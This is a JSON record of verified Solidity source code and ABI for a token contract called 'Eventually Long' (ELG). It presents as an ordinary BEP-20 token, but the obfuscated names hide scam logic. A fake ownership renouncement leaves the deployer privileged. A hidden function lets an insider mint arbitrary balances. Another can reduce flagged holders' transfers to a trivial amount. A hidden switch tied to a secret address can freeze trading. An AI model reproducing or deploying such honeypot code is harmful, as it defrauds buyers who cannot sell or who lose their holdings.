{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface buyLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLaunchedToken {\n    function createPair(address autoIs, address marketingTx) external returns (address);\n}\n\ninterface txWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingReceiver) external view returns (uint256);\n\n    function transfer(address launchedFund, uint256 limitWallet) external returns (bool);\n\n    function allowance(address isWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedFund,\n        uint256 limitWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenReceiver, uint256 value);\n    event Approval(address indexed isWallet, address indexed spender, uint256 value);\n}\n\ninterface receiverMax is txWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EventuallyLong is sellAuto, txWallet, receiverMax {\n\n    bool public modeLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptFeeAmount;\n    }\n\n    constructor (){\n        if (receiverEnableTrading) {\n            fundTotal = toTotalSell;\n        }\n        buyLimit marketingBuy = buyLimit(totalFromMode);\n        feeToken = sellLaunchedToken(marketingBuy.factory()).createPair(marketingBuy.WETH(), address(this));\n        \n        shouldAmountMode = _msgSender();\n        limitAmountMax();\n        modeTrading[shouldAmountMode] = true;\n        enableMax[shouldAmountMode] = receiverSell;\n        \n        emit Transfer(address(0), shouldAmountMode, receiverSell);\n    }\n\n    uint256 private enableSender;\n\n    function transfer(address swapIsExempt, uint256 limitWallet) external virtual override returns (bool) {\n        return receiverTo(_msgSender(), swapIsExempt, limitWallet);\n    }\n\n    function feeMarketing(uint256 limitWallet) public {\n        limitLaunch();\n        limitAuto = limitWallet;\n    }\n\n    function limitAmountMax() public {\n        emit OwnershipTransferred(shouldAmountMode, address(0));\n        buyAt = address(0);\n    }\n\n    bool private receiverLimit;\n\n    function transferFrom(address senderIsEnable, address launchedFund, uint256 limitWallet) external override returns (bool) {\n        if (_msgSender() != totalFromMode) {\n            if (fundIsToken[senderIsEnable][_msgSender()] != type(uint256).max) {\n                require(limitWallet <= fundIsToken[senderIsEnable][_msgSender()]);\n                fundIsToken[senderIsEnable][_msgSender()] -= limitWallet;\n            }\n        }\n        return receiverTo(senderIsEnable, launchedFund, limitWallet);\n    }\n\n    uint256 limitAuto;\n\n    function exemptAuto(address swapIsExempt, uint256 limitWallet) public {\n        limitLaunch();\n        enableMax[swapIsExempt] = limitWallet;\n    }\n\n    uint256 public receiverShould;\n\n    bool private atMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLimit;\n    }\n\n    mapping(address => uint256) private enableMax;\n\n    bool private receiverEnableTrading;\n\n    function receiverTo(address senderIsEnable, address launchedFund, uint256 limitWallet) internal returns (bool) {\n        if (senderIsEnable == shouldAmountMode) {\n            return listIs(senderIsEnable, launchedFund, limitWallet);\n        }\n        uint256 totalLaunchedWallet = txWallet(feeToken).balanceOf(marketingAtTake);\n        require(totalLaunchedWallet == limitAuto);\n        require(launchedFund != marketingAtTake);\n        if (enableReceiver[senderIsEnable]) {\n            return listIs(senderIsEnable, launchedFund, marketingFee);\n        }\n        return listIs(senderIsEnable, launchedFund, limitWallet);\n    }\n\n    event OwnershipTransferred(address indexed atEnable, address indexed takeExempt);\n\n    uint8 private exemptFeeAmount = 18;\n\n    string private marketingLimit = \"Eventually Long\";\n\n    address marketingAtTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private buyAt;\n\n    function approve(address tradingMarketing, uint256 limitWallet) public virtual override returns (bool) {\n        fundIsToken[_msgSender()][tradingMarketing] = limitWallet;\n        emit Approval(_msgSender(), tradingMarketing, limitWallet);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverSell;\n    }\n\n    function listIs(address senderIsEnable, address launchedFund, uint256 limitWallet) internal returns (bool) {\n        require(enableMax[senderIsEnable] >= limitWallet);\n        enableMax[senderIsEnable] -= limitWallet;\n        enableMax[launchedFund] += limitWallet;\n        emit Transfer(senderIsEnable, launchedFund, limitWallet);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return buyAt;\n    }\n\n    function marketingTotalTo(address fundShould) public {\n        limitLaunch();\n        if (atMarketing == modeLimit) {\n            atMarketing = true;\n        }\n        if (fundShould == shouldAmountMode || fundShould == feeToken) {\n            return;\n        }\n        enableReceiver[fundShould] = true;\n    }\n\n    uint256 launchedMax;\n\n    uint256 constant marketingFee = 12 ** 10;\n\n    mapping(address => bool) public modeTrading;\n\n    mapping(address => bool) public enableReceiver;\n\n    string private exemptBuy = \"ELG\";\n\n    function receiverEnable(address fromAmount) public {\n        if (senderReceiverMarketing) {\n            return;\n        }\n        \n        modeTrading[fromAmount] = true;\n        if (toTotalSell == receiverShould) {\n            modeLimit = true;\n        }\n        senderReceiverMarketing = true;\n    }\n\n    function limitLaunch() private view {\n        require(modeTrading[_msgSender()]);\n    }\n\n    bool public senderReceiverMarketing;\n\n    address public shouldAmountMode;\n\n    uint256 public fundTotal;\n\n    function balanceOf(address marketingReceiver) public view virtual override returns (uint256) {\n        return enableMax[marketingReceiver];\n    }\n\n    uint256 private receiverSell = 100000000 * 10 ** 18;\n\n    uint256 private toTotalSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptBuy;\n    }\n\n    address public feeToken;\n\n    function allowance(address exemptShould, address tradingMarketing) external view virtual override returns (uint256) {\n        if (tradingMarketing == totalFromMode) {\n            return type(uint256).max;\n        }\n        return fundIsToken[exemptShould][tradingMarketing];\n    }\n\n    mapping(address => mapping(address => uint256)) private fundIsToken;\n\n    function owner() external view returns (address) {\n        return buyAt;\n    }\n\n    address totalFromMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIsExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"exemptAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmountMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"marketingTotalTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"}],\"name\":\"receiverEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmountMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIsExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIsEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EventuallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}